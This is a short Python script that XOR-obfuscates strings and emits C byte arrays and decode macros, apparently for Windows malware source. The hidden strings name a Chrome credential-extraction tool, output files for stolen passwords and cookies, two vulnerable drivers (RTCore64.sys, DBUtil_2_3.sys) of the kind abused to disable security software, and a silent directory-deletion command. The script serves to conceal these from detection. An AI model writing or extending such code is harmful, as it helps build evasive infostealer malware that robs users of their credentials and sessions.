key = [0x5A, 0x5A^0x37, 0x5A^0x91, 0x5A^0xC5]
strings = {
    'ENC_CHROMELEVATOR_EXE': 'chromelevator_x64.exe',
    'ENC_PASSWORDS_JSON': 'passwords.json',
    'ENC_COOKIES_JSON': 'cookies.json',
    'ENC_RTCORE64': 'RTCore64.sys',
    'ENC_DBUTIL23': 'DBUtil_2_3.sys',
    'ENC_CMD_RMDIR': 'cmd.exe /c rmdir /s /q',
}
for name, s in strings.items():
    enc = [ord(c) ^ key[i%4] for i,c in enumerate(s)]
    b = '{' + ','.join(f'0x{x:02x}' for x in enc) + '}'
    print(f'/* "{s}" */')
    print(f'static const BYTE {name}[] = {b};')
    print(f'#define DEC_{name[4:]}(buf) _xd(buf, {name}, {len(s)}, 0x5A)')
    print()
